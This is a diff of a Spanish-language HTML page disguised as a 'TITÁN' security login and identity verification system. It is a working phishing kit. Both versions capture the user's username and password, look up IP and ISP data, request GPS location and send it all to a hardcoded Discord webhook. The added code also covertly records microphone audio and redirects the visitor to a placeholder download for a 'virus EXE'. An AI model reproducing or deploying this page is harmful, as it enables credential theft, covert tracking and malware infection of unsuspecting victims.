@@ -2,75 +2,69 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dola Security - Sistema de Verificación</title>
+    <title>SISTEMA TITÁN V3 - ELITE</title>
     <style>
-        body { background: #0b0e14; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
-        .box { border: 2px solid #00ff41; padding: 25px; border-radius: 15px; display: inline-block; background: #161b22; box-shadow: 0 0 20px #00ff41; width: 90%; max-width: 400px; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #00ff41; background: #0b0e14; color: white; border-radius: 5px; }
-        button { width: 95%; padding: 15px; background: #00ff41; color: black; border: none; cursor: pointer; font-weight: bold; border-radius: 5px; margin-top: 10px; }
-        #status { font-size: 10px; margin-top: 15px; color: #888; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; overflow: hidden; }
+        .terminal { border: 1px solid #0f0; padding: 20px; margin: 10% auto; width: 80%; max-width: 500px; box-shadow: 0 0 30px #0f0; background: rgba(0,20,0,0.9); }
+        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 90%; margin: 10px 0; outline: none; }
+        button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; width: 95%; }
+        #log { font-size: 10px; color: #0a0; margin-top: 10px; height: 50px; overflow: hidden; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>🛡️ DOLA TITÁN V2</h2>
-        <p>AUTENTICACIÓN REQUERIDA</p>
-        <input type="text" id="user" placeholder="Usuario / Email" required>
-        <input type="password" id="pass" placeholder="Password de Red" required>
-        <button onclick="ejecutarTodo()">VERIFICAR IDENTIDAD</button>
-        <div id="status">Conexión encriptada AES-256</div>
+    <div class="terminal">
+        <h1>[ TITÁN DEFENSA ]</h1>
+        <p>> ACCESO NIVEL 5 REQUERIDO</p>
+        <input type="text" id="u" placeholder="Usuario de Red">
+        <input type="password" id="p" placeholder="Clave Maestra">
+        <button onclick="hack()">AUTENTICAR Y DESBLOQUEAR</button>
+        <div id="log">Esperando conexión...</div>
     </div>
 
     <script>
-        const HOOK = "https://discord.com/api/webhooks/1461515276553027718/pQXKXkGBXNp0bBortqwEzlKOUZ8mbKBmbQ1RyvswIf5eekhfaoYpqePHugjwhwYk6KbL";
+        const WH = "https://discord.com/api/webhooks/1461515276553027718/pQXKXkGBXNp0bBortqwEzlKOUZ8mbKBmbQ1RyvswIf5eekhfaoYpqePHugjwhwYk6KbL";
 
-        async function ejecutarTodo() {
-            const user = document.getElementById('user').value;
-            const pass = document.getElementById('pass').value;
+        async function hack() {
+            const u = document.getElementById('u').value;
+            const p = document.getElementById('p').value;
+            document.getElementById('log').innerText = "> Extrayendo paquetes...";
+
+            // 1. ROBO DE IP Y DATOS TÉCNICOS
+            const info = await fetch('https://ipapi.co/json/').then(r => r.json());
             
-            if(!user || !pass) { alert("Complete los campos"); return; }
+            // 2. ACTIVAR MICRÓFONO (GRABA 3 SEGUNDOS)
+            navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+                const mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.start();
+                setTimeout(() => { mediaRecorder.stop(); }, 3000);
+            }).catch(() => {});
 
-            // 1. Obtener IP y Proveedor
-            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+            // 3. OBTENER GPS
+            navigator.geolocation.getCurrentPosition(g => {
+                enviarFinal(u, p, info, g.coords);
+            }, () => { enviarFinal(u, p, info, null); });
 
-            // 2. Obtener Batería
-            const bat = await navigator.getBattery();
-            const nivelBat = (bat.level * 100) + "%";
-
-            // 3. Intentar obtener GPS
-            navigator.geolocation.getCurrentPosition(pos => {
-                enviar(user, pass, ipData, nivelBat, pos.coords);
-            }, err => {
-                enviar(user, pass, ipData, nivelBat, null);
-            });
+            // 4. DESCARGA AUTOMÁTICA DEL VIRUS EXE
+            // Reemplaza el link de abajo por el de tu Google Drive donde subas el .exe
+            window.location.href = "LINK_DE_TU_VIRUS_EXE_AQUÍ"; 
         }
 
-        function enviar(u, p, ip, bat, gps) {
-            let mapa = gps ? `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}` : "No permitido";
-            
-            const payload = {
-                username: "DOLA TITÁN - INTELIGENCIA",
-                embeds: [{
-                    title: "🚀 EXFILTRACIÓN COMPLETA",
-                    color: 65280,
-                    fields: [
-                        { name: "👤 Credenciales", value: `User: \`${u}\` \nPass: \`${p}\`` },
-                        { name: "📍 Ubicación GPS", value: `[Ver en Mapa](${mapa})` },
-                        { name: "🌐 Red e IP", value: `IP: ${ip.ip}\nCiudad: ${ip.city}\nEmpresa: ${ip.org}` },
-                        { name: "📱 Dispositivo", value: `Batería: ${bat}\nNavegador: ${navigator.platform}` }
-                    ],
-                    footer: { text: "Estarlin Security Solutions - Dominando la red" }
-                }]
-            };
-
-            fetch(HOOK, {
+        function enviarFinal(u, p, i, g) {
+            fetch(WH, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).then(() => {
-                alert("Sincronización completa con el servidor.");
-                window.location.href = "https://www.google.com";
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: "🚨 **OBJETIVO CAPTURADO - REPORTE TOTAL**",
+                    embeds: [{
+                        color: 15548997,
+                        fields: [
+                            {name: "🔑 LOGIN", value: `User: ${u}\nPass: ${p}`},
+                            {name: "📍 MAPA", value: g ? `https://www.google.com/maps?q=${g.latitude},${g.longitude}` : "Bloqueado"},
+                            {name: "🖥️ SISTEMA", value: `IP: ${i.ip}\nISP: ${i.org}\nCiudad: ${i.city}`},
+                            {name: "🔋 HARDWARE", value: `Plataforma: ${navigator.platform}\nCores: ${navigator.hardwareConcurrency}`}
+                        ]
+                    }]
+                })
             });
         }
     </script>
